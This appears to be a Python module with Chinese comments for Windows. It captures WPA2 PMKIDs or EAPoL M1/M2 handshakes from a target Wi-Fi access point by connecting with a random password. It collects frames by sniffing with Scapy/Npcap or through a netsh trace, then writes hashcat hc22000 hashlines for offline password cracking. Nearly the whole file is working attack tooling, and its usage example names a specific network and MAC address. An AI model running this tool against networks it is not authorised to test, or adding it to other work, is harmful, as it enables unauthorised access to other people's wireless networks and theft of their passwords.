#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Windows PMKID 捕获模块
原理：连接目标AP时（用随机密码），AP回复EAPoL Message 1中可能附带PMKID
捕获PMKID后可用hashcat离线破解，不需要反复断网

两种捕获方式：
  方式A：Scapy + Npcap 嗅探 EAPOL 帧（需安装Npcap）
  方式B：pywifi连接 + 解析Windows系统事件日志/ETW跟踪

参考：ZeroDayArcade/capture-pmkid-wpa-wifi-hacking
"""

import subprocess
import time
import os
import sys
import struct
import binascii
from typing import Optional, Tuple
from dataclasses import dataclass


@dataclass
class PMKIDResult:
    """PMKID捕获结果"""
    success: bool = False
    pmkid: str = ""
    mac_ap: str = ""
    mac_client: str = ""
    ssid: str = ""
    hashline: str = ""       # hashcat hc22000格式
    hash_file: str = ""      # 保存的.22000文件路径
    method: str = ""         # 使用的捕获方式
    error: str = ""


def check_npcap() -> Tuple[bool, str]:
    """检查Npcap是否安装"""
    paths = [
        r'C:\Program Files\Npcap',
        r'C:\Program Files (x86)\Npcap',
    ]
    for p in paths:
        if os.path.exists(p):
            return True, f"Npcap已安装: {p}"

    # 注册表检查
    try:
        result = subprocess.run(
            r'reg query "HKLM\SOFTWARE\Npcap" /ve',
            shell=True, capture_output=True, text=True, timeout=5
        )
        if 'Npcap' in result.stdout:
            return True, "Npcap已安装（注册表）"
    except:
        pass

    return False, "Npcap未安装 (下载: https://npcap.com)"


def check_scapy() -> bool:
    """检查scapy是否可用"""
    try:
        import scapy
        return True
    except ImportError:
        return False


def capture_pmkid_scapy(ssid: str, bssid: str, interface: str = None,
                        timeout: int = 30, output_dir: str = "captures") -> PMKIDResult:
    """
    方式A：用Scapy + Npcap嗅探EAPOL帧捕获PMKID
    需要：Npcap（勾选raw 802.11支持）+ scapy
    
    流程：
    1. 启动Scapy嗅探EAPOL帧
    2. 用pywifi连接目标AP（随机密码）
    3. 捕获AP返回的EAPoL Message 1中的PMKID
    """
    try:
        from scapy.all import sniff, EAPOL, Ether, conf, get_if_list
        from scapy.layers.dot11 import Dot11, RadioTap
    except ImportError:
        return PMKIDResult(error="scapy未安装 (pip install scapy)")

    # 确定接口
    if not interface:
        ifaces = get_if_list()
        # 找WiFi接口
        for iface in ifaces:
            if 'wi-fi' in iface.lower() or 'wlan' in iface.lower() or 'wireless' in iface.lower():
                interface = iface
                break
        if not interface and ifaces:
            interface = ifaces[0]

    if not interface:
        return PMKIDResult(error="未找到网络接口")

    print(f"    [PMKID] 使用接口: {interface}")
    print(f"    [PMKID] 目标: {ssid} ({bssid})")

    # 存储捕获的EAPOL帧
    eapol_frames = []
    target_bssid = bssid.lower().replace('-', ':')

    def eapol_callback(pkt):
        """处理捕获到的EAPOL帧"""
        if pkt.haslayer(EAPOL):
            eapol_frames.append(bytes(pkt))
            print(f"    [PMKID] 捕获到EAPOL帧! (长度={len(bytes(pkt))})")

        # 也检查以太网帧中的EAPOL（类型0x888e）
        if pkt.haslayer(Ether):
            if pkt[Ether].type == 0x888e:
                eapol_frames.append(bytes(pkt))
                print(f"    [PMKID] 捕获到EAPOL以太网帧! (长度={len(bytes(pkt))})")

    # 启动后台嗅探
    print(f"    [PMKID] 开始嗅探EAPOL帧...")

    import threading
    stop_sniff = threading.Event()

    def sniff_thread():
        try:
            sniff(iface=interface,
                  prn=eapol_callback,
                  filter="ether proto 0x888e",
                  timeout=timeout,
                  store=0,
                  stop_filter=lambda x: stop_sniff.is_set())
        except Exception as e:
            print(f"    [PMKID] 嗅探错误: {e}")

    sniffer = threading.Thread(target=sniff_thread, daemon=True)
    sniffer.start()

    # 等1秒让嗅探器启动
    time.sleep(1)

    # 连接目标AP（用随机密码触发EAPOL交换）
    print(f"    [PMKID] 尝试连接 {ssid}（触发EAPOL交换）...")
    trigger_eapol_exchange(ssid, bssid)

    # 等待捕获
    wait_time = min(timeout, 15)
    print(f"    [PMKID] 等待EAPOL响应（最多{wait_time}秒）...")
    for i in range(wait_time):
        time.sleep(1)
        if eapol_frames:
            print(f"    [PMKID] 捕获到 {len(eapol_frames)} 个EAPOL帧")
            break

    stop_sniff.set()
    sniffer.join(timeout=3)

    if not eapol_frames:
        return PMKIDResult(
            error="未捕获到EAPOL帧（可能需要Npcap的raw 802.11支持，或AP不发送PMKID）"
        )

    # 解析PMKID
    return parse_pmkid_from_frames(eapol_frames, ssid, bssid, output_dir)


def capture_pmkid_netsh(ssid: str, bssid: str,
                        timeout: int = 30, output_dir: str = "captures") -> PMKIDResult:
    """
    方式B：用netsh + Windows ETW跟踪捕获EAPOL
    不需要Scapy/Npcap，纯Windows原生方案
    
    流程：
    1. 启动Windows网络跟踪（netsh trace）
    2. 连接目标AP触发EAPOL交换
    3. 从跟踪文件中提取PMKID
    """
    os.makedirs(output_dir, exist_ok=True)
    # 必须用绝对路径，否则管理员CMD的工作目录可能不同
    abs_output_dir = os.path.abspath(output_dir)
    trace_file = os.path.join(abs_output_dir, "wifi_trace.etl")

    print(f"    [PMKID] 方式B: Windows网络跟踪")
    print(f"    [PMKID] 目标: {ssid} ({bssid})")

    # 1. 启动网络跟踪（需管理员权限）
    print(f"    [PMKID] 启动网络跟踪...")
    try:
        # 停止可能存在的旧跟踪
        subprocess.run(
            ['netsh', 'trace', 'stop'],
            capture_output=True, text=True, timeout=30,
            encoding='utf-8', errors='replace'
        )
        time.sleep(2)

        # 删除旧的ETL文件（避免"文件已存在"错误）
        for old_file in [trace_file, trace_file.replace('.etl', '.cab')]:
            if os.path.exists(old_file):
                try:
                    os.remove(old_file)
                except:
                    pass

        # 启动新跟踪，捕获网络数据包
        result = subprocess.run(
            ['netsh', 'trace', 'start',
             'capture=yes',
             f'traceFile={trace_file}',
             'maxSize=10',
             'overwrite=yes'],
            capture_output=True, text=True, timeout=20,
            encoding='utf-8', errors='replace'
        )

        if result.returncode != 0:
            error_msg = result.stdout + result.stderr
            if '需要提升' in error_msg or 'elevation' in error_msg.lower() or '拒绝访问' in error_msg:
                return PMKIDResult(error="需要管理员权限运行（右键以管理员身份运行）")
            return PMKIDResult(error=f"启动网络跟踪失败: {error_msg[:200]}")

        print(f"    [PMKID] 网络跟踪已启动")

    except subprocess.TimeoutExpired:
        return PMKIDResult(error="启动网络跟踪超时")
    except Exception as e:
        return PMKIDResult(error=f"网络跟踪错误: {e}")

    # 2. 触发EAPOL交换
    print(f"    [PMKID] 触发EAPOL交换...")
    trigger_eapol_exchange(ssid, bssid)

    # 等待一些时间让交换完成
    print(f"    [PMKID] 等待EAPOL交换完成...")
    time.sleep(5)

    # 3. 停止跟踪
    print(f"    [PMKID] 停止网络跟踪...")
    try:
        subprocess.run(
            ['netsh', 'trace', 'stop'],
            capture_output=True, text=True, timeout=30,
            encoding='utf-8', errors='replace'
        )
    except:
        pass

    # 4. 检查跟踪文件
    if not os.path.exists(trace_file):
        return PMKIDResult(error="网络跟踪文件未生成")

    trace_size = os.path.getsize(trace_file)
    print(f"    [PMKID] 跟踪文件: {trace_file} ({trace_size} bytes)")

    # 5. 尝试从ETL文件中提取EAPOL/PMKID
    # ETL是Windows专有格式，需要转换
    # 尝试用netsh wlan show方式获取PMKID信息
    return extract_pmkid_from_etl(trace_file, ssid, bssid, output_dir)


def trigger_eapol_exchange(ssid: str, bssid: str):
    """
    触发EAPOL交换：连接目标AP用随机密码
    AP会在EAPoL Message 1中附带PMKID（如果支持）
    """
    import random
    import string
    random_pwd = ''.join(random.choices(string.ascii_letters + string.digits, k=12))

    # 用netsh快速连接（不等待成功，只需要触发EAPOL）
    try:
        import tempfile

        # 生成临时profile XML
        ssid_hex = ssid.encode('utf-8').hex()
        ssid_escaped = ssid.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')

        xml = f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid_escaped}_pmkid_test</name>
    <SSIDConfig>
        <SSID>
            <hex>{ssid_hex}</hex>
            <name>{ssid_escaped}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>manual</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{random_pwd}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""

        with tempfile.NamedTemporaryFile(mode='w', suffix='.xml', delete=False,
                                        encoding='utf-8') as f:
            f.write(xml)
            xml_path = f.name

        # 添加profile并连接
        subprocess.run(
            ['netsh', 'wlan', 'add', 'profile', f'filename={xml_path}'],
            capture_output=True, text=True, timeout=5,
            encoding='utf-8', errors='replace'
        )

        subprocess.run(
            ['netsh', 'wlan', 'connect', f'name={ssid_escaped}_pmkid_test'],
            capture_output=True, text=True, timeout=5,
            encoding='utf-8', errors='replace'
        )

        # 等待EAPOL交换发生
        time.sleep(3)

        # 断开并清理
        subprocess.run(
            ['netsh', 'wlan', 'disconnect'],
            capture_output=True, text=True, timeout=5,
            encoding='utf-8', errors='replace'
        )
        time.sleep(1)

        subprocess.run(
            ['netsh', 'wlan', 'delete', 'profile', f'name={ssid_escaped}_pmkid_test'],
            capture_output=True, text=True, timeout=5,
            encoding='utf-8', errors='replace'
        )

        # 清理临时文件
        try:
            os.unlink(xml_path)
        except:
            pass

    except Exception as e:
        print(f"    [PMKID] 触发EAPOL错误: {e}")


def parse_pmkid_from_frames(frames: list, ssid: str, bssid: str,
                            output_dir: str) -> PMKIDResult:
    """从捕获的EAPOL帧中解析PMKID"""
    for frame_data in frames:
        # 搜索EAPOL帧中的PMKID
        # PMKID在RSN IE的最后16字节
        # EAPoL Key帧格式：
        #   Type(1) + Info(2) + KeyLen(2) + ReplayCounter(8) + Nonce(32) + IV(16)
        #   + RSC(8) + ID(8) + MIC(16) + DataLen(2) + Data(variable)
        # PMKID在Data部分的RSN IE中，Tag=0xdd, OUI=00-0f-ac, Type=04

        # 搜索PMKID标记: dd 14 00 0f ac 04 后跟16字节PMKID
        pmkid_tag = bytes([0xdd, 0x14, 0x00, 0x0f, 0xac, 0x04])
        idx = frame_data.find(pmkid_tag)

        if idx != -1:
            pmkid_bytes = frame_data[idx + 6: idx + 6 + 16]
            if len(pmkid_bytes) == 16:
                pmkid = pmkid_bytes.hex()

                # 提取MAC地址
                mac_ap = bssid.lower().replace(':', '').replace('-', '')
                # 客户端MAC从帧中提取或用本机MAC
                mac_cl = get_local_mac()

                # 生成hashcat hc22000格式
                essid_hex = ssid.encode('utf-8').hex()
                hashline = f"WPA*01*{pmkid}*{mac_ap}*{mac_cl}*{essid_hex}***"

                # 保存到文件
                os.makedirs(output_dir, exist_ok=True)
                hash_file = os.path.join(output_dir, f"{ssid}_pmkid.22000")
                with open(hash_file, 'w') as f:
                    f.write(hashline + '\n')

                return PMKIDResult(
                    success=True,
                    pmkid=pmkid,
                    mac_ap=mac_ap,
                    mac_client=mac_cl,
                    ssid=ssid,
                    hashline=hashline,
                    hash_file=hash_file,
                    method="Scapy+EAPOL",
                )

    return PMKIDResult(error="EAPOL帧中未找到PMKID（该AP可能不发送PMKID）")


def extract_pmkid_from_etl(etl_file: str, ssid: str, bssid: str,
                           output_dir: str) -> PMKIDResult:
    """
    从Windows ETL跟踪文件中提取PMKID或握手包哈希
    优先提取PMKID（WPA*01格式），没有则提取EAPoL握手包（WPA*02格式）
    两种格式hashcat -m 22000都支持
    """
    try:
        with open(etl_file, 'rb') as f:
            data = f.read()

        mac_ap = bssid.lower().replace(':', '').replace('-', '')
        mac_cl = get_local_mac()
        essid_hex = ssid.encode('utf-8').hex()
        hash_file = os.path.join(output_dir, f"{ssid}_hash.22000")

        # ── 尝试1: 搜索PMKID标记 dd 14 00 0f ac 04 ──
        pmkid_tag = bytes([0xdd, 0x14, 0x00, 0x0f, 0xac, 0x04])
        idx = data.find(pmkid_tag)
        if idx != -1:
            pmkid_bytes = data[idx + 6: idx + 6 + 16]
            if len(pmkid_bytes) == 16:
                pmkid = pmkid_bytes.hex()
                if pmkid != '0' * 32:
                    hashline = f"WPA*01*{pmkid}*{mac_ap}*{mac_cl}*{essid_hex}***"
                    with open(hash_file, 'w') as f:
                        f.write(hashline + '\n')
                    return PMKIDResult(
                        success=True, pmkid=pmkid,
                        mac_ap=mac_ap, mac_client=mac_cl, ssid=ssid,
                        hashline=hashline, hash_file=hash_file,
                        method="PMKID (ETW)",
                    )

        # ── 尝试2: 从EAPoL M1+M2握手包提取哈希 ──
        # EAPoL帧以以太网类型0x888e标识
        # 帧结构(从0x888e之后): ver(1)+type(1)+len(2)+descriptor(1)+key_info(2)+...
        # Key Info位定义(802.11i): bit3=Pairwise, bit6=Install, bit7=ACK, bit8=MIC
        # M1(AP→STA): ACK=1, MIC=0  |  M2(STA→AP): ACK=0, MIC=1
        eapol_marker = b'\x88\x8e'
        bssid_bytes = bytes.fromhex(mac_ap)

        m1_frames = []
        m2_frames = []

        pos = 0
        while True:
            pos = data.find(eapol_marker, pos)
            if pos == -1:
                break

            nearby = data[max(0, pos - 64):pos]
            if bssid_bytes not in nearby:
                pos += 2
                continue

            if pos + 6 < len(data):
                eapol_type = data[pos + 3]

                if eapol_type == 0x03:  # EAPoL-Key
                    key_len = (data[pos + 4] << 8) | data[pos + 5]
                    eapol_start = pos + 2  # 跳过0x888e
                    eapol_end = eapol_start + 4 + key_len
                    if eapol_end <= len(data):
                        fd = data[eapol_start:eapol_end]

                        if len(fd) > 49:
                            ki = (fd[5] << 8) | fd[6]
                            has_ack = bool(ki & 0x0080)  # bit 7
                            has_mic = bool(ki & 0x0100)  # bit 8

                            if has_ack and not has_mic:
                                # M1: ANonce在偏移17-48
                                anonce = fd[17:49]
                                m1_frames.append({'anonce': anonce, 'raw': fd})
                            elif has_mic and not has_ack:
                                # M2: MIC在偏移81-96
                                m2_frames.append({'raw': fd})
            pos += 2

        if m1_frames and m2_frames:
            m1 = m1_frames[0]
            m2 = m2_frames[0]
            anonce_hex = m1['anonce'].hex()

            # 提取M2的MIC (偏移81-96, 16字节)
            mic_hex = m2['raw'][81:97].hex() if len(m2['raw']) > 96 else '0' * 32

            # M2帧MIC清零版本（用于hashcat验证）
            m2_zeroed = bytearray(m2['raw'])
            if len(m2_zeroed) > 96:
                m2_zeroed[81:97] = b'\x00' * 16

            # hashcat 22000 WPA*02: MIC*MAC_AP*MAC_STA*ESSID*ANONCE*EAPOL(mic清零)*MP
            hashline = (f"WPA*02*{mic_hex}*{mac_ap}*{mac_cl}*"
                       f"{essid_hex}*{anonce_hex}*{m2_zeroed.hex()}*00")

            with open(hash_file, 'w') as f:
                f.write(hashline + '\n')

            return PMKIDResult(
                success=True,
                pmkid=f"handshake(M1+M2)",
                mac_ap=mac_ap, mac_client=mac_cl, ssid=ssid,
                hashline=hashline, hash_file=hash_file,
                method="EAPoL握手包 (ETW)",
            )

        msg = f"M1:{len(m1_frames)}个 M2:{len(m2_frames)}个"
        if not m1_frames and not m2_frames:
            msg = "未找到EAPoL帧（AP可能不支持或未响应）"
        return PMKIDResult(error=f"ETL: {msg}")

    except Exception as e:
        return PMKIDResult(error=f"解析ETL文件失败: {e}")


def get_local_mac() -> str:
    """获取本机WiFi网卡MAC地址"""
    try:
        result = subprocess.run(
            ['netsh', 'wlan', 'show', 'interfaces'],
            capture_output=True, text=True, timeout=5,
            encoding='utf-8', errors='replace'
        )
        for line in result.stdout.split('\n'):
            if '物理地址' in line or 'Physical address' in line.lower():
                mac = line.split(':', 1)[-1].strip() if ':' in line else ""
                # 移除分隔符
                return mac.replace(':', '').replace('-', '').lower()
    except:
        pass
    return "000000000000"


def capture_pmkid(ssid: str, bssid: str, output_dir: str = "captures",
                  timeout: int = 30) -> PMKIDResult:
    """
    自动选择最佳方式捕获PMKID
    优先用Scapy方式，失败则用netsh ETW方式
    """
    os.makedirs(output_dir, exist_ok=True)

    # 方式A：Scapy + Npcap
    npcap_ok, npcap_info = check_npcap()
    scapy_ok = check_scapy()

    if npcap_ok and scapy_ok:
        print(f"    [PMKID] 尝试方式A: Scapy + Npcap")
        result = capture_pmkid_scapy(ssid, bssid, timeout=timeout, output_dir=output_dir)
        if result.success:
            return result
        print(f"    [PMKID] 方式A未成功: {result.error}")

    # 方式B：netsh ETW跟踪
    print(f"    [PMKID] 尝试方式B: Windows网络跟踪")
    result = capture_pmkid_netsh(ssid, bssid, timeout=timeout, output_dir=output_dir)
    if result.success:
        return result

    # 都失败了
    error_parts = []
    if not npcap_ok:
        error_parts.append(f"Npcap未安装({npcap_info})")
    if not scapy_ok:
        error_parts.append("scapy未安装(pip install scapy)")
    error_parts.append(result.error)

    return PMKIDResult(error=" | ".join(error_parts))


# ============================================================
# 命令行测试入口
# ============================================================
if __name__ == '__main__':
    if len(sys.argv) < 3:
        print("用法: python pmkid_capture.py <SSID> <BSSID>")
        print("例如: python pmkid_capture.py Xiaomi_A380 a4:ba:70:04:1a:7e")
        sys.exit(1)

    ssid = sys.argv[1]
    bssid = sys.argv[2]
    print(f"捕获 {ssid} ({bssid}) 的PMKID...")
    result = capture_pmkid(ssid, bssid)

    if result.success:
        print(f"\n✓ PMKID捕获成功!")
        print(f"  PMKID:    {result.pmkid}")
        print(f"  MAC AP:   {result.mac_ap}")
        print(f"  MAC CL:   {result.mac_client}")
        print(f"  SSID:     {result.ssid}")
        print(f"  方式:     {result.method}")
        print(f"  hashline: {result.hashline}")
        print(f"  文件:     {result.hash_file}")
    else:
        print(f"\n✗ PMKID捕获失败: {result.error}")
